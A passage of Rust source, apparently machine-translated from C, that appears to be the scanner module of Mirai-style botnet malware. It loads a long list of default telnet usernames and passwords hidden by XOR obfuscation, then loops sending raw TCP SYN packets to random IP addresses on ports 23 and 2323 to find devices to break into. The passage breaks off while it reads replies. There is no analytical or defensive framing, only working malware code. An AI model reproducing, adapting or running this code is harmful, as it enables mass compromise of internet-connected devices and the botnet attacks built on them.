        b"hta\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x16\x11\x10\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x13\x13\x13\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"WVQVCP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"XMMOCFQN\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"KR\x10\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"KR\x11\x12\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"KR\x16\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"@KLVGA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VQWLCOK\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"C@A\x13\x10\x11\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RW@NKA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x10\x14\x12\x13JZ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"Q[LLGV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"@C[CLFQN\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"SWQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"SWQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"VGAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VGAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"VGAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        1 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\x15\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"oCLCEGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"oCLCEGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"oCLCEGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OCLCEGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"DPKGLF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CRA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CRA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"MGNKLWZ\x13\x10\x11\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VKLK\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CQAGLF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CQAGLF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CQAGLF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"f\x0FnKLI\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"f\x0FnKLI\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FNKLI\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FGDCWNV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"NMEKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"WQGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"NMEKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"NMEKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x03PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"AC@NGAMO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"PMWVGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"LGVMRKC\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"LGVMRKC\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"Q[QCFO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"Q[QCFO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"Q[QCFO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CLKAWQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FG@WE\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"F\x0CG\x0C@\x0CW\x0CE\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        9 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FG@WE\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"Q[LLGV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"GAJM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"GAJM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FKCE\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QUKVAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QUKVAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VGNLGV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"VGNLGV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VGNLGV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"VMMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"ACNTKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16SUGP\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"PMMV\x13\x10\x11\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CJGVXKR\x1A\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x14\x1B\x14\x1B\x14\x1B\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RC\x17\x17U\x12PF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x13\x10\x11\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"pmmv\x17\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CNRKLG\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"XVG\x1BZ\x13\x17\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"@\x13\x10\x12PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"rcqqumpf\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"cfokl\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cfokl\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"cfokl\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"LGVEGCP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"LGVEGCP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"TV\x13\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RW@NKA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"K@O\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCQQUMPF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"T[CVVC\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"T[CVVC\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CVA\x16\x17\x14\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OKAPMQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"OKAPMQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QGVWR\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QGVWR\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"AMOACQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"AMOACQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"RMQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RMQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"UUU\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"UUU\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        3 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x10\x1A\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x10\x1A\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"w`lv\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"w`lv\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"LGVOCL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"Cfokl\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"Cfokl\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FCGOML\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FCGOML\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FCGOML\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FGOM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"FGOM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        4 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CPPKQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"nKLIQ[Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"ANKGLV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"ANKGLV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"AKQAM\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"akqam\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRGP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QWPV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        5 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x15\x14\x17\x16\x11\x10\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"\x15\x14\x17\x16\x11\x10\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        7 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFQN\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFQN\x13\x10\x11\x16\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"RCVPMN\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"RCVPMN\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OE\x11\x17\x12\x12\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"OGPNKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"LGVCFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"JGUNRCAI\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"lGVkaQ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        6 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"@@QF\x0FANKGLV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"lwnn\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        11 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKLVVF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKLVVF\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"MRGPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"MRGPCVMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"rNAOqRkR\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"rNAOqRkR\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x13\x13\x13\x13\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"\x13\x13\x13\x13\x13\x13\x13\x13\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"\x10\x10\x10\x10\x10\x10\x10\x10\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        b"\x10\x10\x10\x10\x10\x10\x10\x10\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QGAWPKV[\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QGAWPKV[\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OMWLVQ[Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"OMWLVQ[Q\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        8 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OGOMVGA\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QWRGPTKQMP\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"nqKW{\x15RmOxe\x10Q\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"cFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x11whwJ\x10tGOgDwVG\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        14 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"OWQGCFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"oWQG\x03cFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QVMPUCVAJ\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"QRGAKCNKQV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"CFOKLRNFV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"RNFVCFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"\x13\x10\x11\x16\x17\x14\x15\x1A\x1B\x12\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        10 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"@@QF\x0FANKGLV\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"AJCLEGOG\x10\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        11 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"VGNGAMOCFOKL\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CFOKLVGNGAMO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        12 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"EWGQV\"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"ZA\x11\x14\x13\x13\"\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        13 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"FGDCWNV\"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"CLVQNS\"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        15 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"QWRGPTKQMP\"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"X[CF\x13\x10\x11\x16\"\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        20 as libc::c_int as uint16_t,
    );
    add_auth_entry(
        b"PMMV\"\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        b"X[CF\x13\x10\x11\x16\"\0" as *const u8 as *const libc::c_char
            as *mut libc::c_char,
        14 as libc::c_int as uint16_t,
    );
    let mut port_: libc::c_int = 23 as libc::c_int;
    loop {
        let mut fdset_rd: fd_set = fd_set { __fds_bits: [0; 16] };
        let mut fdset_wr: fd_set = fd_set { __fds_bits: [0; 16] };
        let mut conn: *mut scanner_connection = 0 as *mut scanner_connection;
        let mut tim: timeval = timeval { tv_sec: 0, tv_usec: 0 };
        let mut last_avail_conn: libc::c_int = 0;
        let mut last_spew: libc::c_int = 0;
        let mut mfd_rd: libc::c_int = 0 as libc::c_int;
        let mut mfd_wr: libc::c_int = 0 as libc::c_int;
        let mut nfds: libc::c_int = 0;
        if fake_time != last_spew as libc::c_uint {
            last_spew = fake_time as libc::c_int;
            i_0 = 0 as libc::c_int;
            while i_0 < 8912 as libc::c_int {
                let mut paddr: sockaddr_in = {
                    let mut init = sockaddr_in {
                        sin_family: 0 as libc::c_int as sa_family_t,
                        sin_port: 0,
                        sin_addr: in_addr { s_addr: 0 },
                        sin_zero: [0; 8],
                    };
                    init
                };
                let mut iph_0: *mut iphdr = scanner_rawpkt.as_mut_ptr() as *mut iphdr;
                let mut tcph_0: *mut tcphdr = iph_0.offset(1 as libc::c_int as isize)
                    as *mut tcphdr;
                (*iph_0).id = rand_next() as uint16_t;
                (*iph_0).saddr = LOCAL_ADDR;
                (*iph_0).daddr = get_random_ip();
                (*iph_0).check = 0 as libc::c_int as uint16_t;
                (*iph_0)
                    .check = checksum_generic(
                    iph_0 as *mut uint16_t,
                    ::std::mem::size_of::<iphdr>() as libc::c_ulong as uint32_t,
                );
                if i_0 % 10 as libc::c_int == 0 as libc::c_int {
                    port_ = 2323 as libc::c_int;
                    (*tcph_0)
                        .dest = ((2323 as libc::c_int as libc::c_ushort as libc::c_int
                        & 0xff as libc::c_int) << 8 as libc::c_int
                        | (2323 as libc::c_int as libc::c_ushort as libc::c_int
                            & 0xff00 as libc::c_int) >> 8 as libc::c_int) as uint16_t;
                } else {
                    port_ = 23 as libc::c_int;
                    (*tcph_0)
                        .dest = ((23 as libc::c_int as libc::c_ushort as libc::c_int
                        & 0xff as libc::c_int) << 8 as libc::c_int
                        | (23 as libc::c_int as libc::c_ushort as libc::c_int
                            & 0xff00 as libc::c_int) >> 8 as libc::c_int) as uint16_t;
                }
                (*tcph_0).seq = (*iph_0).daddr;
                (*tcph_0).check = 0 as libc::c_int as uint16_t;
                (*tcph_0)
                    .check = checksum_tcpudp(
                    iph_0,
                    tcph_0 as *mut libc::c_void,
                    ((::std::mem::size_of::<tcphdr>() as libc::c_ulong as libc::c_ushort
                        as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
                        | (::std::mem::size_of::<tcphdr>() as libc::c_ulong
                            as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                            >> 8 as libc::c_int) as uint16_t,
                    ::std::mem::size_of::<tcphdr>() as libc::c_ulong as libc::c_int,
                );
                paddr.sin_family = 2 as libc::c_int as sa_family_t;
                paddr.sin_addr.s_addr = (*iph_0).daddr;
                paddr.sin_port = (*tcph_0).dest;
                sendto(
                    rsck,
                    scanner_rawpkt.as_mut_ptr() as *const libc::c_void,
                    ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                    MSG_NOSIGNAL as libc::c_int,
                    &mut paddr as *mut sockaddr_in as *mut sockaddr,
                    ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
                );
                i_0 += 1;
            }
        }
        last_avail_conn = 0 as libc::c_int;
        loop {
            let mut n: libc::c_int = 0;
            let mut dgram: [libc::c_char; 1514] = [0; 1514];
            let mut iph_1: *mut iphdr = dgram.as_mut_ptr() as *mut iphdr;
            let mut tcph_1: *mut tcphdr = iph_1.offset(1 as libc::c_int as isize)
                as *mut tcphdr;
            let mut conn_0: *mut scanner_connection = 0 as *mut scanner_connection;
            *__errno_location() = 0 as libc::c_int;
            n = recvfrom(
                rsck,
                dgram.as_mut_ptr() as *mut libc::c_void,
                ::std::mem::size_of::<[libc::c_char; 1514]>() as libc::c_ulong,
